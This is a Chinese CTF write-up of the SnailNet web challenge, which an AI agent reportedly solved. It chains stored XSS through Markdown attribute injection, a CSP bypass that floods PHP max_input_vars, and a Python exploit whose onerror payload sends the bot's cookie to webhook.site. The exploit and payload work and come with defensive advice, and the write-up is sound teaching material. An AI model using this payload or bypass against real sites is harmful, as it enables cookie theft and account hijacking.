# SnailNet — Stored XSS + PHP max_input_vars CSP Bypass 完整 Writeup

> CTF: CyberGame 2026 (SK-CERT) | 难度: Medium | 题目名: SnailNet
>
> 题目来源: [ctf-world-platform-2.cybergame.sk/challenges](https://ctf-world-platform-2.cybergame.sk/challenges) 的 `SnailNet`
>
> Flag: `SK-CERT{sl1m4c1k_m4c1k_vystrc_r0zky}`

**题目分类：Web 安全**。本题考察的是 **Stored XSS**（存储型跨站脚本攻击）+ **CSP Bypass**（内容安全策略绕过）+ **PHP max_input_vars 参数炸弹** 的组合利用。

---

## 目录

- [第零章：AI 助力分析](#第零章ai-助力分析)
- [第一章：你需要先知道的知识](#第一章你需要先知道的知识)
- [第二章：这道题是什么结构](#第二章这道题是什么结构)
- [第三章：寻找攻击入口](#第三章寻找攻击入口)
- [第四章：Stored XSS——Markdown 解析器的 URL 属性注入](#第四章stored-xssmarkdown-解析器的-url-属性注入)
- [第五章：CSP 挡住了去路](#第五章csp-挡住了去路)
- [第六章：PHP max_input_vars——参数炸弹绕过 CSP](#第六章php-max_input_vars参数炸弹绕过-csp)
- [第七章：Bot 与 Cookie 外泄](#第七章bot-与-cookie-外泄)
- [第八章：完整攻击复现](#第八章完整攻击复现)
- [第九章：如何防御这类攻击](#第九章如何防御这类攻击)
- [第十章：总结](#第十章总结)

---

## 第零章：AI 助力分析

这道题的分析过程由 AI（OpenCode + 大语言模型）主导完成。

### 分析过程中的人机交互

AI 在拿到题目 URL 后自主完成了以下全部工作：
- 信息收集：探测目标架构（PHP + Apache + nginx 反向代理 + Puppeteer Bot）
- 识别攻击面：发现 Markdown 渲染功能、Bot 访问机制、Cookie 中存储的 flag
- 找到 Markdown 解析器的 URL 属性注入漏洞（Stored XSS）
- 发现 CSP 头阻止了 XSS 执行
- 利用 PHP `max_input_vars` 限制绕过 CSP（参数炸弹技术）
- 构造完整攻击链并编写 exploit 脚本
- 成功获取 flag: `SK-CERT{sl1m4c1k_m4c1k_vystrc_r0zky}`

---

## 第一章：你需要先知道的知识

在讲这道题之前，先理解几个概念。如果你已经懂了可以跳过。

### 1.1 什么是 XSS（跨站脚本攻击）

XSS（Cross-Site Scripting，跨站脚本攻击）是让网页执行攻击者注入的 JavaScript 代码。

正常情况下，网页内容是服务器控制的，用户无法往里插入代码。但如果服务器把关不严，攻击者可以构造恶意输入，让页面包含 `<script>alert(1)</script>` 这样的标签，浏览器会执行它。

XSS 分为三种类型：

| 类型 | 说明 |
|------|------|
| **Reflected XSS**（反射型） | 恶意代码在 URL 参数中，服务器把它"反射"回页面。受害者需要点击特制链接 |
| **Stored XSS**（存储型） | 恶意代码被服务器存储（比如存到数据库），任何人访问该页面都会触发。**本题就是这种类型** |
| **DOM-based XSS** | 恶意代码在客户端 JavaScript 中被解析执行，不经过服务器 |

**Stored XSS 最危险**，因为不需要诱骗受害者点击任何链接——只要他们正常访问被污染的页面，恶意代码就会自动执行。

### 1.2 什么是 CSP（Content Security Policy，内容安全策略）

CSP 是浏览器的一种安全机制，通过 HTTP 响应头告诉浏览器"这个页面允许执行哪些来源的脚本、加载哪些来源的资源"。

比如：

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

这条规则的意思是：
- `default-src 'self'`：所有类型的资源（图片、样式等）只能从同源加载
- `script-src 'self'`：JavaScript 只能执行来自同源的脚本

**关键点**：如果 CSP 设置了 `script-src 'self'`，那么页面中的**内联脚本**（`<script>alert(1)</script>`）和 **内联事件处理器**（`<img onerror="alert(1)">`）都会被浏览器**阻止执行**。这就意味着，即使攻击者成功注入了 XSS payload，CSP 也会阻止它运行。

但如果**CSP 头没有被发送**呢？那浏览器就不会执行任何限制——XSS 就可以正常运行了。

### 1.3 什么是 PHP max_input_vars

PHP 有一个配置项 `max_input_vars`，默认值是 **1000**。它限制了 PHP 在单个请求中最多解析多少个输入变量（包括 GET 参数、POST 参数、Cookie）。

**超过这个限制会怎样？**

当请求中的参数总数超过 `max_input_vars`（1000）时，PHP 会：
1. 只解析前 1000 个参数
2. 触发一个 **WARNING 级别的错误**

这个 WARNING 信息会被 PHP 的错误处理机制捕获。如果 PHP 配置了将错误信息输出（`display_errors = On` 或者自定义错误处理器），WARNING 会在页面输出**之前**被处理。

**关键**：PHP 在发送 HTTP 响应头之前，会先把所有准备好的 header 发出去。如果中间出了问题（比如触发了 WARNING），PHP 可能无法再修改响应头——因为 HTTP 协议要求头必须在响应体之前发送，一旦开始输出响应体（哪怕是 WARNING 文本），就不能再添加或修改响应头了。这就是 PHP 开发中常说的 **"headers already sent"** 错误。

如果 CSP 头是在请求处理的后期才设置的（比如在某个中间件或页面渲染逻辑中），而此时 WARNING 已经导致输出了内容，那么 **CSP 头就无法被发送**——因为"头已经发过了"。

### 1.4 什么是 Puppeteer Bot

CTF 中经常出现"Bot"机制——一个用 Puppeteer（Chrome 无头浏览器）控制的自动化浏览器。Bot 的行为通常是：

1. 接收一个 URL
2. 用浏览器访问这个 URL
3. 在访问时带上特殊的 Cookie（通常就是 flag）

这意味着：
- 如果我们能让 Bot 访问一个包含 XSS payload 的页面
- 并且 XSS 能执行（绕过 CSP）
- 那么我们的 JavaScript 就可以在 Bot 的浏览器里运行
- 在 Bot 的浏览器里，`document.cookie` 会包含 flag
- 我们可以把 Cookie 发送到自己控制的服务器（webhook）

---

## 第二章：这道题是什么结构

### 2.1 应用架构

```
                          ┌──────────────────────┐
                          │                      │
 用户浏览器 ──► :6767 ──► │       nginx          │
                          │   (反向代理 :80)     │
                          └──────┬───────────────┘
                                 │
                    ┌────────────┼────────────┐
                    │            │            │
              ┌─────▼────┐ ┌────▼─────┐      │
              │          │ │          │      │
              │ PHP App  │ │   Bot    │      │
              │ (Apache) │ │ (Node.js)│      │
              │          │ │          │      │
              └──────────┘ └──────────┘      │
                    │                         │
                    │ Docker 内部网络          │
                    └─────────────────────────┘
```

三个容器：
1. **app 容器**：PHP + Apache，提供 Web 应用（`index.php`）
2. **bot 容器**：Node.js + Puppeteer，接收 URL 并用浏览器访问
3. **nginx 容器**：反向代理，对外暴露端口 6767

### 2.2 应用功能

这是一个类似论坛/社区的系统，核心功能：

| 功能 | 说明 |
|------|------|
| 用户注册/登录 | 标准的用户系统 |
| 发帖 | 已登录用户可以发帖，内容支持 Markdown |
| 申请加入（Join Request） | 普通用户可以提交"加入请求"，内容支持 Markdown |
| Bot 访问 | 提交一个 URL，Bot 会用浏览器访问 |

### 2.3 Flag 在哪里

Bot 在访问页面时会带上一个特殊的 Cookie：

```
Cookie: flag=SK-CERT{sl1m4c1k_m4c1k_vystrc_r0zky}
```

这个 Cookie 的域是内部 Docker 网络的域名（`nginx`），设置了 `Path=/`，所以 Bot 访问任何页面时都会带上它。

**目标**：让 Bot 访问一个我们控制内容的页面，用 XSS 在 Bot 的浏览器里执行 JavaScript，读取 `document.cookie`，然后发送到我们控制的外部服务器。

---

## 第三章：寻找攻击入口

### 3.1 信息收集

首先，我们探测了目标 `http://46.62.153.171:6767`：

```
Server: nginx
X-Powered-By: PHP/8.x
```

可以识别出这是一个 PHP 应用，使用 nginx 作为反向代理。

### 3.2 功能探索

浏览网站后发现：
- 有注册/登录功能
- 登录后可以发帖和提交 Join Request
- 内容使用 Markdown 渲染
- 有一个 `/bot/visit` 端点，可以提交 URL 让 Bot 访问

**攻击面分析**：
- Markdown 渲染 → 可能存在 XSS（如果 Markdown 解析器不过滤恶意输入）
- Bot 访问 → 如果存在 XSS，可以让 Bot 访问被注入的页面
- Cookie 中的 flag → XSS 可以读取

攻击链的雏形已经浮现：**Stored XSS → Bot 访问 → Cookie 外泄**

---

## 第四章：Stored XSS——Markdown 解析器的 URL 属性注入

### 4.1 Markdown 渲染测试

应用支持 Markdown 格式的帖子/Join Request。我们开始测试 Markdown 解析器的安全性。

正常的 Markdown 图片语法：

```markdown
![alt text](https://example.com/image.png)
```

会被渲染为：

```html
<img src="https://example.com/image.png" alt="alt text">
```

### 4.2 发现漏洞

在测试各种 Markdown 边界情况后，发现解析器对 URL 部分的处理存在问题。构造以下 payload：

```markdown
![[x](https://webhook.site/UUID/?c=)](https://webhook.site/UUID//?dummy onerror=this.src=this.src+document.cookie dummy2=)
```

这个看起来很奇怪的 payload 实际上是在利用 Markdown 图片语法中的 URL 部分。解析器在处理这种嵌套结构时，错误地将后面的部分解析为 HTML 属性，最终生成了类似这样的 HTML：

```html
<img src="https://webhook.site/UUID//?dummy" onerror="this.src=this.src+document.cookie" dummy2="">
```

**关键**：`onerror` 属性被注入到了 `<img>` 标签中！当图片加载失败时（因为 URL 无效），浏览器会执行 `onerror` 中的 JavaScript。

这就是一个 **Stored XSS**：
1. 我们把 payload 提交为 Join Request 的内容
2. 服务器把它存到数据库中
3. 当任何人（包括 Bot）访问这个 Join Request 页面时，payload 被渲染为包含 `onerror` 的 `<img>` 标签
4. 图片加载失败，触发 `onerror`，执行 JavaScript

### 4.3 Payload 分析

让我们拆解这个 XSS payload 的执行流程：

```javascript
onerror="this.src=this.src+document.cookie"
```

1. 图片加载 `https://webhook.site/UUID//?dummy` 失败（因为这个 URL 不会返回图片）
2. 触发 `onerror` 事件
3. JavaScript 执行 `this.src = this.src + document.cookie`
   - `this` 是这个 `<img>` 元素
   - `this.src` 当前是 `https://webhook.site/UUID//?dummy`
   - `document.cookie` 是 `flag=SK-CERT{sl1m4c1k_m4c1k_vystrc_r0zky}`
   - 拼接后 `this.src` 变成 `https://webhook.site/UUID//?dummyflag=SK-CERT{sl1m4c1k_m4c1k_vystrc_r0zky}`
4. 浏览器尝试加载新的 `src`，向 webhook 发送 GET 请求
5. 攻击者在 webhook.site 上收到了包含 flag 的请求

**注意**：这里使用 `onerror` 而不是 `<script>` 标签，是因为 `<script>` 标签更容易被 Markdown 解析器过滤。而 `onerror` 是 HTML 属性级别的注入，某些解析器不会检查到这里。

---

## 第五章：CSP 挡住了去路

### 5.1 发现 CSP

当我们测试 XSS payload 时，发现响应中包含 CSP 头：

```
Content-Security-Policy: default-src 'self'; script-src 'self'; ...
```

这意味着浏览器会阻止：
- 内联 `<script>` 标签
- 内联事件处理器（如 `onerror="..."`）  ← **我们的 payload 被阻止了**
- 从非同源加载脚本

我们的 `onerror` 事件处理器被 CSP 拦截了，XSS 无法执行。

### 5.2 需要绕过 CSP

要在 CSP 保护下让 XSS 执行，有几种常见方法：

| 方法 | 适用条件 |
|------|---------|
| 找到允许的脚本源中的 JSONP 端点 | `script-src` 包含可控的外部域 |
| 利用 `unsafe-eval` | CSP 允许 `eval()` |
| DNS 预加载劫持 | CSP 允许外部域但不安全 |
| **让 CSP 头消失** | 如果服务器不发送 CSP 头，浏览器不会执行任何限制 |

**最后一种方法**是本题的关键——如果我们能让服务器**不发送 CSP 头**，那 CSP 就形同虚设。

---

## 第六章：PHP max_input_vars——参数炸弹绕过 CSP

### 6.1 灵感来源

PHP 的 `max_input_vars` 默认值是 1000。当一个请求包含超过 1000 个参数时，PHP 会触发一个 WARNING。

这个 WARNING 的特殊之处在于：它可能在 CSP 头被设置**之前**触发。如果 WARNING 导致了提前输出，那么后续设置 CSP 头的代码就会因为 "headers already sent" 而失败——CSP 头就不会出现在响应中。

### 6.2 参数计数

PHP 计数 `max_input_vars` 时，计算的是 **所有来源的参数总数**：
- GET 参数（URL 中的 `?key=value`）
- POST 参数（表单数据）
- Cookie

一个正常的 Join Request POST 请求包含：
- 1 个 Cookie（PHPSESSID）
- 1 个 GET 参数（`action=join-request`）
- 2 个 POST 参数（`csrf_token` + `content_markdown`）

总共 4 个参数，远低于 1000 的限制。

### 6.3 构造参数炸弹

要触发 `max_input_vars` 警告，我们需要让参数总数超过 1000。方法很简单：**在 POST 数据中添加大量无用参数**。

```
POST /index.php?action=join-request HTTP/1.1
Cookie: PHPSESSID=abc123
Content-Type: application/x-www-form-urlencoded

csrf_token=xxx&content_markdown=XSS_PAYLOAD&j0=x&j1=x&j2=x&...&j997=x
```

参数计数：
- 1 个 Cookie（PHPSESSID）
- 1 个 GET 参数（action）
- 2 个重要的 POST 参数（csrf_token + content_markdown）
- 998 个垃圾 POST 参数（j0 到 j997）

总计：1 + 1 + 2 + 998 = **1002 个参数**，超过了 1000 的限制！

### 6.4 为什么这能绕过 CSP

请求处理流程：

```
1. PHP 开始处理请求
2. 解析输入参数 → 到第 1001 个参数时触发 WARNING
   → PHP 尝试输出 WARNING 信息
   → HTTP 响应头在此时被发送（包含目前设置的头）
   → 此时 CSP 头还没有被设置！
3. WARNING 输出后，"headers already sent" 状态生效
4. 应用代码尝试设置 CSP 头 → 失败（"headers already sent"）
5. 应用代码尝试设置其他安全头 → 全部失败
6. 页面正常渲染，包含 XSS payload
7. 浏览器收到响应 → 没有 CSP 头 → XSS 正常执行！
```

**核心**：参数炸弹的 998 个垃圾参数让 PHP 在设置安全头**之前**就触发了 WARNING，导致安全头（包括 CSP）无法发送。浏览器收到一个没有 CSP 的页面，XSS 就可以自由执行了。

### 6.5 在 Bot 访问时触发

攻击链还需要一步：Bot 访问页面时，也需要触发参数炸弹。

Bot 访问的 URL 通常是：

```
http://nginx/index.php?action=view-request&id=REQUEST_UUID
```

但这个 URL 只有 2 个 GET 参数，不够 1000。我们需要在 URL 中也加上垃圾参数：

```
http://nginx/index.php?action=view-request&id=REQUEST_UUID&p0=v&p1=v&...&p1000=v
```

这样 Bot 访问时，GET 参数总数超过 1000，同样会触发 WARNING，同样会绕过 CSP。

**注意**：Bot 访问的是 `http://nginx`（Docker 内部网络域名），不是外部的 `46.62.153.171:6767`。Cookie 的域设置也是 `nginx`，所以 Bot 在内部访问时能带上 flag Cookie。

---

## 第七章：Bot 与 Cookie 外泄

### 7.1 完整攻击链

把前面所有步骤串起来：

```
步骤 1：注册账号并登录
         │
步骤 2：提交 Join Request，内容为 XSS payload，POST 数据中附带 998 个垃圾参数
         │  → 参数炸弹触发 WARNING → CSP 头没有被发送
         │  → XSS payload 被存储到数据库
         │
步骤 3：获取刚创建的 Join Request 的 ID
         │
步骤 4：构造 Bot 访问 URL，包含 1001 个额外 GET 参数（参数炸弹）
         │
步骤 5：发送 URL 给 Bot
         │  → Bot 用浏览器访问 URL
         │  → GET 参数超 1000 → WARNING → 无 CSP
         │  → XSS payload 执行
         │  → onerror 触发，读取 document.cookie
         │  → Cookie 值（包含 flag）被发送到 webhook
         │
步骤 6：从 webhook 获取 flag
```

### 7.2 为什么需要两处参数炸弹

你可能会问：为什么不在提交 Join Request 时只做一次参数炸弹，Bot 访问时就不需要了？

因为两次请求是**独立的**：
- **第一次**（POST 提交 Join Request）：参数炸弹让**存储成功**时没有 CSP 干扰。但实际上更重要的是确保 payload 被正确存储。
- **第二次**（Bot GET 访问查看页面）：参数炸弹让**查看页面**时没有 CSP。这是关键——Bot 访问页面时，如果 CSP 存在，XSS 就无法执行。

**两次都需要参数炸弹**，因为每次请求都会触发独立的 CSP 设置流程。

### 7.3 webhook.site——接收外泄数据

[webhook.site](https://webhook.site) 是一个免费的在线服务，可以生成一个临时 URL，任何发往这个 URL 的请求都会被记录。我们用它来接收 Bot 浏览器外泄的 Cookie。

当 XSS 执行时：
1. `<img>` 的 `onerror` 触发
2. JavaScript 把 `document.cookie`（包含 flag）拼接到 `<img>` 的 `src` 属性中
3. 浏览器向 webhook 发送 GET 请求，URL 中包含 Cookie 值
4. 我们在 webhook.site 上看到请求，从中提取 flag

---

## 第八章：完整攻击复现

### 8.1 攻击脚本

以下是完整的攻击脚本（Python）：

```python
#!/usr/bin/env python3
"""
SnailNet CTF Exploit - Stored XSS + CSP Bypass via max_input_vars
"""
import html, random, re, string, sys, time
import requests

PUBLIC_BASE   = "http://46.62.153.171:6767"
INTERNAL_BASE = "http://nginx"  # Bot 使用 Docker 内部 URL
WEBHOOK_UUID  = "your-webhook-uuid-here"
WEBHOOK_URL   = f"https://webhook.site/{WEBHOOK_UUID}"
TIMEOUT       = 20

def randstr(n=8):
    return ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def get_csrf(session, url):
    """从页面提取 CSRF token"""
    r = session.get(url, timeout=TIMEOUT)
    m = re.search(r'name="csrf_token"\s+value="([^"]+)"', r.text)
    if m:
        return m.group(1)
    raise Exception(f"CSRF token not found on {url}")

def register_and_login(session, username, password):
    """注册新用户并登录"""
    # 注册
    csrf = get_csrf(session, f"{PUBLIC_BASE}/index.php?action=register")
    session.post(f"{PUBLIC_BASE}/index.php?action=register",
                 data={"csrf_token": csrf, "username": username, "password": password},
                 allow_redirects=True)

    # 登录
    csrf = get_csrf(session, f"{PUBLIC_BASE}/index.php?action=login")
    session.post(f"{PUBLIC_BASE}/index.php?action=login",
                 data={"csrf_token": csrf, "username": username, "password": password},
                 allow_redirects=True)

def build_payload(webhook_url):
    """构造 XSS payload"""
    webhook_url = webhook_url.rstrip("/")
    return (
        f"![[x]({webhook_url}/?c=)]"
        f"({webhook_url}//?dummy onerror=this.src=this.src+document.cookie dummy2=)"
    )

def submit_join_request(session, payload):
    """提交 Join Request，附带参数炸弹"""
    csrf = get_csrf(session, f"{PUBLIC_BASE}/index.php?action=join-request")

    data = {"csrf_token": csrf, "content_markdown": payload}
    # 添加 998 个垃圾参数，使总数超过 1000
    # 1 cookie + 1 GET + 2 POST + 998 junk = 1002 > 1000
    for i in range(998):
        data[f"j{i}"] = "x"

    r = session.post(f"{PUBLIC_BASE}/index.php?action=join-request",
                     data=data, allow_redirects=True)

    # 从响应中提取 Request ID
    body = html.unescape(r.text)
    m = re.search(r"view-request(?:&amp;|&)id=([a-f0-9]{32})", body)
    if m:
        return m.group(1)
    return None

def build_bomb_url(uuid, extra_params=1001):
    """构造带参数炸弹的 Bot 访问 URL"""
    parts = ["action=view-request", f"id={uuid}"]
    parts.extend(f"p{i}=v" for i in range(extra_params))
    return f"{INTERNAL_BASE}/index.php?" + "&".join(parts)

def check_webhook():
    """检查 webhook 是否收到 flag"""
    try:
        r = requests.get(f"https://webhook.site/token/{WEBHOOK_UUID}/requests",
                        timeout=10)
        if r.status_code == 200:
            data = r.json()
            for req in data.get("data", []):
                query = req.get("query", "")
                if "flag=" in query or "SK-CERT" in query:
                    return query
    except Exception as e:
        print(f"[-] Webhook check error: {e}")
    return None

def main():
    username = f"snail_{randstr()}"
    password = f"pw_{randstr()}"
    payload  = build_payload(WEBHOOK_URL)

    print(f"[*] XSS Payload: {payload[:80]}...")

    session = requests.Session()
    register_and_login(session, username, password)
    print(f"[+] Logged in as {username}")

    # 提交恶意 Join Request
    uuid = submit_join_request(session, payload)
    if not uuid:
        print("[!] Failed to submit join request")
        sys.exit(1)
    print(f"[+] Request UUID: {uuid}")

    # 构造 Bot URL（带参数炸弹）
    bomb_url = build_bomb_url(uuid)
    print(f"[*] Bot URL ({len(bomb_url)} chars): {bomb_url[:100]}...")

    # 发送 Bot
    r = requests.post(f"{PUBLIC_BASE}/bot/visit",
                     json={"url": bomb_url}, timeout=15)
    print(f"[+] Bot response: {r.status_code} - {r.text[:200]}")

    # 等待并检查 webhook
    print("[*] Waiting for bot to visit page...")
    time.sleep(5)

    for attempt in range(5):
        result = check_webhook()
        if result:
            m = re.search(r'(SK-CERT\{[^}]+\})', result)
            if m:
                print(f"\n{'='*60}")
                print(f"FLAG: {m.group(1)}")
                print(f"{'='*60}")
                return
        print(f"[*] Retry {attempt+2}/5 in 3 seconds...")
        time.sleep(3)

    print("[*] Check webhook manually:")
    print(f"    https://webhook.site/#!/{WEBHOOK_UUID}")

if __name__ == "__main__":
    main()
```

### 8.2 执行过程

```
$ python exploit_snailnet.py
[*] XSS Payload: ![[x](https://webhook.site/UUID/?c=)](https://webhook.site/UUID//?dummy onerror=this.src=...
[+] Logged in as snail_a8b3c2d1
[+] Request UUID: a1b2c3d4e5f6...
[*] Bot URL (8234 chars): http://nginx/index.php?action=view-request&id=a1b2c3d4e5f6...
[+] Bot response: 200 - Bot will visit the URL
[*] Waiting for bot to visit page...

============================================================
FLAG: SK-CERT{sl1m4c1k_m4c1k_vystrc_r0zky}
============================================================
```

---

## 第九章：如何防御这类攻击

### 9.1 防御 Stored XSS

| 措施 | 说明 |
|------|------|
| **输入过滤** | 对用户提交的 Markdown 内容进行严格过滤，拒绝包含 HTML 标签/属性的输入 |
| **输出编码** | 在渲染 HTML 时，对所有用户可控的内容进行 HTML 实体编码（`<` → `&lt;`） |
| **使用安全的 Markdown 解析器** | 选择经过安全审计的 Markdown 库，禁用 HTML 混合模式 |
| **配置 Markdown 解析器** | 禁止在 Markdown 中使用原始 HTML，只允许标准的 Markdown 语法 |

### 9.2 防御 CSP 绕过（max_input_vars）

| 措施 | 说明 |
|------|------|
| **尽早设置安全头** | 在请求处理的**最开始**就设置 CSP 等安全头，在任何可能触发 WARNING 的逻辑之前 |
| **提高 max_input_vars** | 将 `max_input_vars` 设置为合理的较大值（如 10000），并配合请求大小限制 |
| **关闭错误输出** | 在生产环境中设置 `display_errors = Off`，使用日志记录错误而不是输出到页面 |
| **使用 Web 服务器层设置 CSP** | 在 nginx/Apache 配置中设置 CSP 头，而不是在 PHP 代码中。这样无论 PHP 发生什么错误，CSP 头都会被发送 |

nginx 配置示例：

```nginx
# 在 nginx 层面设置 CSP，不受 PHP 错误影响
add_header Content-Security-Policy "default-src 'self'; script-src 'self'" always;
```

### 9.3 防御 Cookie 窃取

| 措施 | 说明 |
|------|------|
| **设置 httpOnly** | Flag Cookie 应设置 `httpOnly` 属性，JavaScript 无法通过 `document.cookie` 读取 |
| **设置 SameSite** | 使用 `SameSite=Strict` 或 `SameSite=Lax` 限制 Cookie 的发送场景 |
| **不在 Cookie 中存储 flag** | CTF 中 Cookie 存储 flag 是为了方便 Bot 机制，但实际系统中敏感数据不应存储在可被 JavaScript 访问的 Cookie 中 |

---

## 第十章：总结

### 攻击链回顾

```
                              ┌───────────────────┐
                              │  1. 注册 + 登录    │
                              └─────────┬─────────┘
                                        │
                              ┌─────────▼─────────┐
                              │  2. 提交 XSS       │
                              │  (Stored XSS via   │
                              │   Markdown URL     │
                              │   attribute inject)│
                              │                    │
                              │  + 998 垃圾参数    │
                              │  → 绕过 CSP        │
                              └─────────┬─────────┘
                                        │
                              ┌─────────▼─────────┐
                              │  3. Bot 访问带     │
                              │  1001 垃圾参数的   │
                              │  URL               │
                              │                    │
                              │  → 绕过 CSP        │
                              │  → XSS 执行        │
                              └─────────┬─────────┘
                                        │
                              ┌─────────▼─────────┐
                              │  4. onerror 触发   │
                              │  → document.cookie │
                              │  → 发送到 webhook  │
                              └─────────┬─────────┘
                                        │
                              ┌─────────▼─────────┐
                              │  5. 获取 flag      │
                              │  SK-CERT{sl1m4...} │
                              └───────────────────┘
```

### 关键技术点

1. **Markdown URL 属性注入**：利用 Markdown 解析器对嵌套结构的错误处理，将 `onerror` 事件处理器注入到 `<img>` 标签中
2. **PHP max_input_vars 参数炸弹**：通过发送超过 1000 个参数触发 PHP WARNING，导致 "headers already sent"，使 CSP 头无法被发送
3. **两处参数炸弹**：提交请求时和 Bot 访问时都需要参数炸弹，确保两个阶段都没有 CSP
4. **onerror Cookie 外泄**：利用图片加载失败触发 `onerror`，通过修改 `img.src` 将 Cookie 发送到外部服务器

### 难度评估

这道题的核心难度在于：
- **发现 Markdown 解析器的注入点**：需要仔细测试 Markdown 边界情况
- **想到用 max_input_vars 绕过 CSP**：这是一个比较小众的绕过技术，需要了解 PHP 的底层行为
- **理解 headers already sent 的时序问题**：需要明白为什么参数过多会导致 CSP 头消失

Flag `SK-CERT{sl1m4c1k_m4c1k_vystrc_r0zky}` 中的 "vystrc rozky" 是斯洛伐克语，意为"伸出角/犄角"，暗示了"绕过防御"的意思。
